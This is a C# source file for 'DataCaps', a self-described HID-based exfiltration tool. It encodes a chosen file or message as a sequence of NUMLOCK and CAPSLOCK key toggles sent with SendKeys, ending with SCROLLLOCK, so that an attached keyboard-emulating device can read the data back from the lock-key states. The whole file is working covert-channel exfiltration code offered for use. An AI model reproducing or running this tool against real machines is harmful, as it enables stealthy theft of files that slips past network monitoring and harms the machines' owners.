using System;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;

class Program
{
    // Define the ASCII art logo
    const string Logo = @"
        ______      _         _____  _____                 
        |  _  \    | |       / __  \/  __ \                
        | | | |__ _| |_ __ _ `' / /'| /  \/ __ _ _ __  ___ 
        | | | / _` | __/ _` |  / /  | |    / _` | '_ \/ __|
        | |/ / (_| | || (_| |./ /___| \__/\ (_| | |_) \__ \
        |___/ \__,_|\__\__,_|\_____/ \____/\__,_| .__/|___/
                                                | |        
                                                |_|     
                                                     by 0i41E
    ";

    static void Main(string[] args)
    {
        string input = "";
        bool isFile = false;
        bool isMessage = false;
        byte[] fileBytes = null;
        int threshold = 2000; // Maybe decrease - This already takes quite some time

        // Check if any arguments were provided
        if (args.Length == 0)
        {
            ShowHelpMenu();
            return;
        }

        // Parse the arguments
        for (int i = 0; i < args.Length; i++)
        {
            if (args[i] == "/file")
            {
                isFile = true;
                if (i + 1 < args.Length)
                {
                    string filePath = args[i + 1];
                    if (File.Exists(filePath))
                    {
                        fileBytes = File.ReadAllBytes(filePath); // Read bytes from provided file
                    }
                    else
                    {
                        Console.WriteLine($"Error: File '{filePath}' not found.");
                        return;
                    }
                }
                else
                {
                    Console.WriteLine("Error: Missing file path after /file argument.");
                    return;
                }
            }
            else if (args[i] == "/message")
            {
                isMessage = true;
                if (i + 1 < args.Length)
                {
                    input = args[i + 1];
                }
                else
                {
                    Console.WriteLine("Error: Missing message after /message argument.");
                    return;
                }
            }
        }

        if (!isFile && !isMessage)
        {
            ShowHelpMenu();
            return;
        }

        string keysToSend = "";

        // Start a timer to measure the execution time
        Stopwatch stopwatch = Stopwatch.StartNew();

        if (isFile)
        {
            if (fileBytes.Length > threshold)
            {
                Console.WriteLine($"Converting a large file of {fileBytes.Length} bytes. This may take a while...");
                Console.WriteLine("");
            }

            // Convert file bytes to binary string
            for (int j = 0; j < fileBytes.Length; j++)
            {
                byte b = fileBytes[j];
                for (int i = 7; i >= 0; i--)
                {
                    if ((b & (1 << i)) != 0)
                    {
                        keysToSend += "{NUMLOCK}";
                    }
                    else
                    {
                        keysToSend += "{CAPSLOCK}";
                    }
                }

                // Provide progress feedback for every 250 bytes processed, if the size > 2000 bytes
                if (fileBytes.Length > threshold && j % 250 == 0)
                {
                    Console.SetCursorPosition(0, Console.CursorTop);
                    Console.Write($"Processed {j} of {fileBytes.Length} bytes...");
                }
            }
        }
        else if (isMessage)
        {
            char[] charArray = input.ToCharArray();
            if (charArray.Length > threshold)
            {
                Console.WriteLine($"Converting a large message of {charArray.Length} characters. This may take a while...");
                Console.WriteLine("");
            }

            // Convert message to a char array and then to binary string
            for (int j = 0; j < charArray.Length; j++)
            {
                char character = charArray[j];
                for (int i = 7; i >= 0; i--)
                {
                    if ((character & (1 << i)) != 0)
                    {
                        keysToSend += "{NUMLOCK}";
                    }
                    else
                    {
                        keysToSend += "{CAPSLOCK}";
                    }
                }

                // Progress status for message being bigger than 2000 bytes
                if (charArray.Length > threshold && j % 250 == 0)
                {
                    Console.SetCursorPosition(0, Console.CursorTop);
                    Console.Write($"Processed {j} of {charArray.Length} characters...");
                }
            }
        }

        keysToSend += "{SCROLLLOCK}";

        // Stop the timer
        stopwatch.Stop();

        // Estimate the total time required
        double estimatedTime = (isFile ? fileBytes.Length : input.Length) * 8 * 0.035; // Assuming each bit takes 0.035 seconds to process

        // Display the estimated time until finish
        Console.WriteLine(Logo);
        Console.WriteLine("");
        Console.WriteLine($"Estimated time until completion: {estimatedTime:F2} seconds");

        // Send the lock key sequence
        SendKeys.SendWait(keysToSend);
    }

    // Help Menu
    static void ShowHelpMenu()
    {
        Console.WriteLine(Logo);
        Console.WriteLine("");
        Console.WriteLine("HID-Based Exfiltration Tool");
        Console.WriteLine("");
        Console.WriteLine("Usage:");
        Console.WriteLine("  /file <file_path>   Convert the contents of the specified file.");
        Console.WriteLine("  /message <message>  Convert the specified message.");
    }
}
